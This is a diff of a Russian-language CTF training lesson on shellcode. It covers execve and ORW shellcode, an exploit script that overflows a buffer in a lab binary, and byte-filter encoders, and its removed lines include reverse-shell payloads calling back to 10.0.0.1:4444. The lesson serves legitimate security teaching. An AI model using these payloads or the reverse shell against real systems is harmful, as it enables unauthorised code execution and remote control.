@@ -14,307 +14,228 @@ useful_for:
 estimated_minutes: 60
 summary: "Пишем shellcode (execve /bin/sh), учимся его инжектить, кодировать для обхода фильтров и понимаем, почему NX его блокирует."
 ---
-Shellcode — машинный код, который внедряется в процесс и исполняется. В задачах, где NX выключен и стек (или иной буфер) исполняем, shellcode даёт прямой контроль: вместо длинных ROP-цепочек достаточно положить байты `execve('/bin/sh')` и передать туда управление. Этот урок охватывает написание, инъекцию, кодирование и ограничения shellcode.
 
-## Что такое shellcode и его виды
+## Вопрос, с которого всё начинается
 
-Shellcode бывает `execve` (запуск shell), `open/read/write` (ORW — чтение флага при отсутствии shell), `bind shell` (слушает порт), `reverse shell` (подключается назад), `egghunter` (поиск маркера в памяти) и «staged» (загрузчик второго этапа). В CTF чаще всего нужен `execve('/bin/sh')` или ORW под seccomp.
+Мы умеем возвращаться в существующие функции. Но что, если нужной функции в бинаре нет? Например, ни `win`, ни вызова `system` — а shell получить надо. Тогда мы пишем собственный код и заставляем процессор его выполнить. Такой код называют **shellcode** — от «код, открывающий shell».
 
-## Написание через pwntools shellcraft
+Разберём, что это, как его писать и почему он не всегда срабатывает.
+
+## Наш пример: код, который открывает shell
+
+Цель — вот такая программа на ассемблере: выполнить системный вызов `execve("/bin/sh", NULL, NULL)`. Проще говоря, попросить операционную систему запустить командную оболочку.
+
+Начнём с инструмента, который уже знает, как это записать. В pwntools есть модуль `shellcraft`:
 
 ```python
-from pwn import *
-context.arch = 'amd64'
-asm(shellcraft.sh())                        # execve /bin/sh
-asm(shellcraft.cat('/flag'))                # open/read/write
-asm(shellcraft.amd64.linux.sh())
-asm(shellcraft.execve('/bin/sh', 0, 0))
-print(disasm(asm(shellcraft.sh())))
+>>> from pwn import *
+>>> context.arch = 'amd64'
+>>> print(shellcraft.sh())
+    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
+    push 0x68
+    mov rax, 0x732f2f2f6e69622f
+    push rax
+    mov rdi, rsp
+    xor esi, esi
+    xor edx, edx
+    push 0x3b
+    pop rax
+    syscall
 ```
 
-Вывод `disasm` для `shellcraft.sh()`:
+Здесь ещё ассемблер, а не байты. Превратим в машинный код и посмотрим длину:
 
-```
-   0:   48 31 f6                xor    rsi, rsi
-   3:   56                      push   rsi
-   4:   48 bf 2f 62 69 6e ...   movabs rdi, 0x68732f6e69622f
-   e:   57                      push   rdi
-   f:   54                      push   rsp
-  10:   5f                      pop    rdi
-  11:   6a 3b                   push   0x3b
-  13:   58                      pop    rax
-  14:   99                      cdq
-  15:   0f 05                   syscall
+```python
+>>> code = asm(shellcraft.sh())
+>>> len(code)
+48
+>>> code.hex()
+'6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05'
 ```
 
-## Ручной shellcode для amd64
+Получилось 48 байт. Это и есть shellcode — готовая последовательность инструкций, которую можно вписать в эксплойт.
+
+## Шаг 1. Разбираем байты вручную
+
+Чтобы не быть «пользователем чёрного ящика», разберём этот код построчно.
 
 ```asm
-; execve('/bin/sh', NULL, NULL)
-xor rsi, rsi
-push rsi
-mov rdi, 0x68732f2f6e69622f   ; '//bin/sh'
-push rdi
-mov rdi, rsp
-xor rdx, rdx
-push 59
-pop rax
-syscall
+push 0x68                 ; кладём на стек байт 'h'
+mov rax, 0x732f2f2f6e69622f ; rax = "/bin///sh" (8 байт)
+push rax                  ; строка "/bin///sh" теперь на стеке
+mov rdi, rsp              ; rdi = указатель на строку (первый аргумент execve)
+xor esi, esi              ; argv = NULL
+xor edx, edx              ; envp = NULL
+push 0x3b ; pop rax       ; rax = 59 — номер syscall execve
+syscall                   ; выполнить системный вызов
 ```
 
-Сборка:
+Ключевые идеи:
 
-```bash
-nasm -f elf64 sh.asm -o sh.o
-objcopy -O binary -j .text sh.o sh.bin
-python3 -c "print(open('sh.bin','rb').read().hex())"
-```
+- Строка `/bin/sh` должна лежать в памяти, поэтому её «пушат» на стек и берут адрес через `rsp`.
+- В `rdi` кладут путь, в `rsi` и `rdx` — нули (аргументы и окружение).
+- В `rax` кладут **номер системного вызова** `execve` (59), и инструкция `syscall` передаёт управление ядру.
 
-## Ручной shellcode для i386
+Номера системных вызовов — это как «кнопки» ядра. `execve` = 59, `read` = 0, `write` = 1. Их таблицу стоит держать под рукой.
 
-```asm
-xor eax, eax
-push eax
-push 0x68732f2f
-push 0x6e69622f
-mov ebx, esp
-xor ecx, ecx
-xor edx, edx
-mov al, 11
-int 0x80
-```
+## Шаг 2. Проверяем shellcode в песочнице
 
-В i386 короче: `int 0x80`, регистры 32-битные, номер syscall в `eax` (11 для execve).
-
-## ORW-shellcode при seccomp
-
-Когда seccomp запрещает `execve`, но разрешает `open`/`read`/`write`, используется ORW:
+Прежде чем встраивать в эксплойт, проверим, что код работает. Запустим его в изолированном кусочке памяти с правами на исполнение:
 
 ```python
-from pwn import *
-context.arch = 'amd64'
-sc = shellcraft.open('/flag')
-sc += shellcraft.read('rax', 'rsp', 0x100)
-sc += shellcraft.write(1, 'rsp', 0x100)
-print(asm(sc).hex())
+>>> from pwn import *
+>>> context.arch = 'amd64'
+>>> p = run_shellcode(asm(shellcraft.sh()))
+>>> p.sendline(b'id')
+>>> print(p.recvline())
+b'uid=1000(user) gid=1000(user)\n'
 ```
 
-Эквивалент вручную: `open('/flag', 0)`, `read(fd, buf, 0x100)`, `write(1, buf, 0x100)`.
+`run_shellcode` создаёт исполняемый участок памяти, копирует туда байты и передаёт туда управление. Если команда `id` отработала — shellcode верный.
 
-## Инъекция shellcode
+## Шаг 3. Инъекция в переполнение
 
-| Способ | Условие |
-|---|---|
-| на стек через переполнение | NX off, адрес стека известен |
-| в `bss` через `read` | NX off или mprotect |
-| `jmp rsp`-гаджет | NX off |
-| в `mmap`-регион | есть вызов `mmap` |
-| после `mprotect` | NX on, но есть `mprotect` |
-
-Классика: переполняем буфер, затем возвращаемся на `jmp rsp` (или на адрес буфера на стеке). Если ASLR рандомизирует стек, адрес нужно утечь.
-
-```python
-from pwn import *
-context.arch = 'amd64'
-sc = asm(shellcraft.sh())
-payload = sc.ljust(72, b'\x90') + p64(stack_addr)   # возврат на буфер
-```
-
-## Ограничения и кодирование
-
-Ввод может фильтровать байты (`\x00`, `\x0a`, `\x0d`, `\x20`). Тогда применяют:
-
-- **Альфавитно-цифровой shellcode.** Все байты — `[A-Za-z0-9]`. Инструмент `msfvenom -p linux/x64/exec -e x86/alpha_mixed`.
-- **Полиморфный shellcode.** Самомодифицирующийся, обходит сигнатурные детекторы.
-- **Egghunter.** Маленький код, ищущий в памяти маркер (`egg`) и прыгающий на найденный shellcode — когда места для полного shellcode мало.
-- **Самокодирование XOR.** Байты декодируются во время исполнения.
+Теперь встроим shellcode в наш знакомый `vuln` и переполним буфер так, чтобы управление ушло на код. Запустим программу, где стек исполняемый (флаг `-z execstack`):
 
 ```bash
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/alpha_mixed -f python
+$ gcc -fno-stack-protector -no-pie -z execstack -o vuln vuln.c
+$ checksec --file=./vuln
+    NX:       NX disabled
 ```
 
-## Тонкости и подводные камни
-
-- **Нулевые байты.** `mov rdi, 0x...` даёт нули; используйте `push`/`pop` или `xor`.
-- **Позиционная независимость.** Shellcode не должен ссылаться на абсолютные адреса — используйте `lea`/`call`-pop.
-- **Размер.** Малый буфер требует короткого shellcode; `shellcraft.sh()` ~23 байта на amd64.
-- **Выравнивание стека.** `execve` может требовать выровненного стека.
-- **NX и ASLR.** Без исполняемого стека shellcode бесполезен — нужен ROP/mprotect.
-- **Симлинк `/bin/sh`.** `//bin/sh` короче и без нулей; некоторые системы требуют `/bin/sh` целиком.
-- **`syscall` vs `int 0x80`.** На amd64 `int 0x80` работает в 32-битном режиме — используйте `syscall`.
-
-## Справочные таблицы
-
-| Задача | shellcraft |
-|---|---|
-| shell | `shellcraft.sh()` |
-| cat файл | `shellcraft.cat('/flag')` |
-| ORW | `open`+`read`+`write` |
-| bind | `shellcraft.bindsh(port)` |
-| reverse | `shellcraft.connect(host, port)` |
-
-| Архитектура | Номер execve | Инструкция |
-|---|---|---|
-| amd64 | 59 | `syscall` |
-| i386 | 11 | `int 0x80` |
-| arm64 | 221 | `svc #0` |
-| arm32 | 11 | `svc #0` |
-| mips | 4011 | `syscall` |
-
-## Практический пример end-to-end
+Стек теперь можно исполнять. Схема payload: сначала shellcode, затем заполнитель до смещения возврата, затем адрес начала нашего shellcode.
 
 ```python
 #!/usr/bin/env python3
 from pwn import *
-context.binary = elf = ELF('./chall')
+
 context.arch = 'amd64'
+elf = ELF('./vuln')
+OFFSET = 72
+sc = asm(shellcraft.sh())
 
-def start():
-    return process('./chall') if args.LOCAL else remote('host', 1337)
-
-def exploit():
-    p = start()
-    p.recvuntil(b'stack: ')
-    stack = int(p.recvline().strip(), 16)
-    log.info(f'stack @ {hex(stack)}')
-    sc = asm(shellcraft.sh())
-    payload = sc.ljust(72, b'\x90') + p64(stack)
-    p.sendline(payload)
-    p.interactive()
-
-exploit()
+p = process('./vuln')
+buf_addr = 0x7fffffffe3a0        # адрес буфера из GDB
+payload  = sc
+payload += b'A' * (OFFSET - len(sc))
+payload += p64(buf_addr)
+p.sendline(payload)
+p.interactive()
 ```
 
-## Что дальше / решение
+Адрес буфера берут в GDB (`p &buf` или `telescope`). Работает только потому, что NX выключен и ASLR не двигает стек между запусками (в GDB ASLR обычно отключён).
 
-Дальше: `pwn-shellcode-advanced` (полиморфный, egghunter, alphanumeric), `pwn-seccomp-srop` (ORW при seccomp), `pwn-rop` (когда NX включён). Практический алгоритм: (1) `checksec` — NX off?; (2) определите ограничения ввода (какие байты фильтруются); (3) сгенерируйте shellcode через `shellcraft`, проверьте размер и отсутствие запрещённых байтов; (4) найдите адрес буфера (утечка или `jmp rsp`); (5) постройте payload. Если NX включён — shellcode не поможет, переходите к ROP и ORW.
+## Шаг 4. Почему NX его блокирует
 
-## Ограничения по байтам и способы кодирования
-
-Фильтры байтов — частая защита. Если запрещён `\x00`, избегайте `mov` с полным регистром; используйте `push`/`pop` и `xor`. Если запрещены все байты кроме `[A-Za-z0-9]`, нужен alphanumeric-энкодер: `msfvenom -p linux/x64/exec CMD=/bin/sh -e x86/alpha_mixed -f raw`. Если запрещён `\x0a`/`\x0d` (перевод строки), заменяйте инструкции на эквиваленты. Полиморфный shellcode добавляет декодер, меняющийся каждый запуск, что обходит сигнатуры.
-
-## Egghunter: когда места мало
-
-Когда буфер слишком мал для полного shellcode, применяют egghunter — короткий (~30 байт) код, который перебирает память страница за страницей в поисках маркера (например, `EGG` = `0x45474721`). Найдя маркер, он прыгает на shellcode, лежащий в другом месте. Алгоритм: перебор адресов с шагом страницы, обработка `EFAULT` через `sigaction` или через syscall, который безопасно возвращает ошибку (`access`), чтобы не падать на невалидной памяти.
-
-## Reverse shell shellcode
-
-```python
-from pwn import *
-context.arch = 'amd64'
-sc = shellcraft.connect('10.0.0.1', 4444)
-sc += shellcraft.dupsh()
-print(asm(sc).hex())
-```
-
-`connect` открывает сокет, `dupsh` дублирует его на stdin/stdout/stderr и запускает shell. Для bind-shell аналогично: `shellcraft.bindsh(4444)`. На сервере слушайте `nc -lvnp 4444`. Обратите внимание: shellcode с фиксированным IP содержит нулевые/неудобные байты — проверяйте фильтры.
-
-## Полный пример ORW при seccomp
-
-```python
-from pwn import *
-context.arch = 'amd64'
-sc  = shellcraft.open('/flag', 0, 0)
-sc += shellcraft.read('rax', 'rsp', 0x100)
-sc += shellcraft.write(1, 'rsp', 0x100)
-code = asm(sc)
-print(f'shellcode {len(code)} bytes: {code.hex()}')
-```
-
-Вывод: `shellcode 45 bytes: 6a0068...`. Этот shellcode не вызывает `execve`, поэтому проходит seccomp-фильтр, разрешающий только `open`/`read`/`write`. Если и `open` запрещён — используйте `openat`, `sendfile` или уже открытый fd (например, `0` или `3`).
-
-## Отладка shellcode
+Вернём NX обратно и попробуем тот же payload:
 
 ```bash
-gdb ./chall
-(gdb) run
-(gdb) x/40i $rsp          # дизассемблировать shellcode в памяти
-(gdb) stepi               # пошагово
-(gdb) info registers
+$ gcc -fno-stack-protector -no-pie -o vuln vuln.c   # без -z execstack
 ```
 
-Если shellcode падает, проверьте: нет ли нулевых байтов в адресах, выровнен ли стек, не перезаписан ли код. Иногда полезно `printf`-отладка: вставьте `int3` (`\xcc`) в начало и посмотрите в GDB.
+```bash
+$ python3 exp.py
+Segmentation fault
+```
 
-## Расширенная таблица syscall
+Программа упала, хотя адрес буфера верный. Причина — NX: страница стека помечена как «данные, не код». Процессор отказывается исполнять оттуда. Проверить это можно через `vmmap` в GDB: у `[stack]` нет бита `x`.
 
-| Syscall | amd64 | i386 | arm64 |
-|---|---|---|---|
-| read | 0 | 3 | 63 |
-| write | 1 | 4 | 64 |
-| open | 2 | 5 | — |
-| openat | 257 | 295 | 56 |
-| execve | 59 | 11 | 221 |
-| mmap | 9 | 90 | 222 |
-| mprotect | 10 | 125 | 226 |
-| exit | 60 | 1 | 93 |
+Вывод: shellcode на стеке работает **только без NX**. Если NX включён (а это почти всегда), нужен другой путь — возврат в уже существующий исполняемый код (ROP), о котором поговорим в следующем уроке.
 
-## Сводка
+## Шаг 5. Если NX нельзя отключить
 
-Shellcode нужен, когда память исполняема. Генерируйте его через `shellcraft`, проверяйте длину и запрещённые байты, кодируйте при фильтрах (alphanumeric, полиморфный, egghunter). При NX переходите к ROP и ORW; при seccomp избегайте `execve` в пользу `open`/`read`/`write`. Всегда проверяйте shellcode в GDB пошагово — это быстрее, чем отлаживать его вслепую на удалённой цели.
+Иногда shellcode всё же нужен, но NX мешает. Тогда ищут область памяти, которая **и так** исполняемая, — например, саму секцию кода. Если ввод программы не исполняется, но где-то есть `jmp rsp` или `call rdi`, можно спрыгнуть на подготовленную строку.
 
-## Мини-шпаргалка
+Другой частый случай — **ORW-shellcode**: когда программа работает под фильтром системных вызовов (seccomp) и `execve` запрещён. Тогда shellcode делает не запуск shell, а чтение файла `flag` через `open`/`read`/`write`:
 
-| Задача | Код |
-|---|---|
-| shell | `asm(shellcraft.sh())` |
-| ORW | `shellcraft.open/read/write` |
-| reverse | `shellcraft.connect(host,port)+dupsh()` |
-| alphanumeric | `msfvenom -e x86/alpha_mixed` |
-| дизасм | `disasm(asm(sc))` |
-| отладка | `x/40i $rsp` в GDB |
+```python
+>>> sc = shellcraft.open('flag') + shellcraft.read('rax', 'rsp', 100) + shellcraft.write(1, 'rsp', 100)
+>>> print(sc)
+    /* open('flag', O_RDONLY) */
+    mov rax, 2
+    ...
+```
 
-## Заключительное замечание
+Здесь `open` = 2, `read` = 0, `write` = 1. Вместо shell мы просто печатаем содержимое файла — а это и есть цель.
 
-Shellcode остаётся самым прямым способом получить исполнение, когда память исполняема. Его главные ограничения — фильтры байтов, размер буфера и защита NX/seccomp. Освойте `shellcraft` для быстрой генерации, `msfvenom` для кодирования под фильтры и ORW-шаблоны для seccomp. Помните, что на современных системах NX включён почти всегда, поэтому shellcode чаще встречается в CTF, чем в реальной эксплуатации, где доминирует ROP.
+## Кодирование shellcode для обхода фильтров
+
+Иногда программа фильтрует ввод: выбрасывает нулевые байты, перевод строки или целые последовательности. Тогда «чистый» shellcode не проходит, и его кодируют.
+
+**Убираем нулевые байты.** Ноль часто встречается в адресах и константах. Например, `mov rax, 0x3b` содержит нули; вместо него пишут `push 0x3b; pop rax`, где нулевых байтов нет. Проверить наличие нулей можно так:
+
+```python
+>>> code = asm(shellcraft.sh())
+>>> b'\x00' in code
+False
+```
+
+**Кодирование через XOR.** Если запрещён какой-то байт, shellcode шифруют ключом и добавляют в начало короткий декодер, который расшифрует остальное на месте. В pwntools это делает `encoder.encode`:
+
+```python
+>>> encoded = encode(asm(shellcraft.sh()), avoid=b'\x00\x0a')
+>>> len(encoded)
+```
+
+**Alphanumeric/printable shellcode.** Когда разрешены только буквы и цифры, используют shellcode, целиком состоящий из печатных символов. Такие наборы дают `msfvenom -p linux/x64/exec -e x86/alpha_mixed` или `shellcraft` с ограничением.
+
+**Egghunter.** Если места под shellcode мало, а данных много, в буфер кладут «яйцо» — метку с реальным кодом, а в маленький буфер — короткий поисковик, который сканирует память в поисках метки. Полезно, когда переполнение вмещает лишь несколько десятков байт.
+
+Общий принцип: **сначала напиши рабочий shellcode, потом адаптируй его под фильтр** — кодированием, разбиением или egghunter.
+
+## Что мы теперь знаем
+
+- Shellcode — это машинный код, который выполняет процессор напрямую.
+- Для shell нужен `execve("/bin/sh", NULL, NULL)`: строка на стек, `rdi` — путь, `rax` — номер syscall.
+- Номера системных вызовов: `execve` = 59, `read` = 0, `write` = 1, `open` = 2.
+- Проверять shellcode удобно через `run_shellcode`.
+- NX делает стек неисполняемым, поэтому shellcode на стеке не работает.
+- Под seccomp вместо shell делают ORW-shellcode: читают и печатают файл.
 
 ## Квиз
 
 ```quiz
-- question: "Почему NX блокирует shellcode на стеке?"
+- question: "Что делает инструкция syscall?"
   options:
-    - "Стек помечен как неисполняемый"
-    - "Стек зашифрован"
-    - "Стек read-only"
-    - "Стек в ядре"
-  answer: 0
-  explanation: "NX делает страницы данных (стек/куча) неисполняемыми."
-- question: "Зачем обнулять регистры через xor?"
+    - "Вызывает функцию из libc"
+    - "Передаёт управление ядру по номеру в rax"
+    - "Очищает стек"
+    - "Завершает процесс"
+  answer: 1
+  explanation: "Номер системного вызова лежит в rax; syscall выполняет его в ядре."
+- question: "Почему shellcode на стеке не работает при включённом NX?"
   options:
-    - "Чтобы избежать нулевых байтов в shellcode"
-    - "Чтобы включить ASLR"
-    - "Чтобы расширить tcache"
-    - "Чтобы снять canary"
-  answer: 0
-  explanation: "xor reg,reg не содержит нулевых байтов и обнуляет регистр."
-- question: "Что делает syscall execve в shellcode?"
+    - "Стек слишком мал"
+    - "Страница стека не помечена как исполняемая"
+    - "Shellcode длиннее 64 байт"
+    - "rax занят"
+  answer: 1
+  explanation: "NX запрещает исполнение кода из страниц данных, включая стек."
+- question: "Зачем в shellcode кладут '/bin/sh' на стек?"
   options:
-    - "Запускает /bin/sh"
-    - "Читает файл"
-    - "Открывает сокет"
-    - "Пишет в память"
+    - "Чтобы получить указатель на строку через rsp"
+    - "Чтобы освободить регистры"
+    - "Чтобы вызвать printf"
+    - "Чтобы зашифровать код"
   answer: 0
-  explanation: "execve('/bin/sh',0,0) даёт интерактивную оболочку."
-- question: "Что делать, если shellcode не влезает в буфер?"
+  explanation: "execve нужен указатель на путь; строка пушится на стек, а её адрес берётся из rsp."
+- question: "Когда нужен ORW-shellcode?"
   options:
-    - "Использовать egghunter/stage2 или mprotect-ROP"
-    - "Отключить NX"
-    - "Снять canary"
-    - "Расширить GOT"
+    - "Когда execve запрещён фильтром seccomp"
+    - "Когда включён NX"
+    - "Когда нет libc"
+    - "Когда стек исполняемый"
   answer: 0
-  explanation: "Egghunter и двухстадийная загрузка решают проблему размера."
-- question: "Как проверить shellcode локально?"
-  options:
-    - "run_shellcode(sc) в pwntools или запустить через mmap-буфер"
-    - "nmap"
-    - "ldd"
-    - "readelf"
-  answer: 0
-  explanation: "pwntools run_shellcode исполняет shellcode для проверки."
+  explanation: "ORW (open/read/write) читает и печатает файл, не запуская shell."
 ```
+
+## Куда дальше
+
+Shellcode — это «свой код», но NX делает его почти бесполезным на стеке. В следующем уроке (`pwn-rop`) мы обойдём NX, не выполняя свой код, а комбинируя уже существующие кусочки: ROP-цепочки. Запомни главное: **shellcode требует исполняемой памяти; если её нет — комбинируй чужой код.**
 
 ## Где пригодится
 
-- **CTF:** Pwn — задачи с исполняемым стеком.
-- **Bug bounty:** обход фильтров ввода.
-- **Пентест:** payload-разработка.
-- **Работа:** exploit development.
+- **CTF Pwn:** задачи с отключённым NX или с фильтром seccomp решаются shellcode.
+- **Обход фильтров ввода:** кодирование shellcode помогает, когда запрещены отдельные байты.
+- **Exploit development:** понимание syscall-интерфейса нужно для любой низкоуровневой атаки.
+- **Embedded:** shellcode под ARM/MIPS — стандартный инструмент эксплуатации IoT.
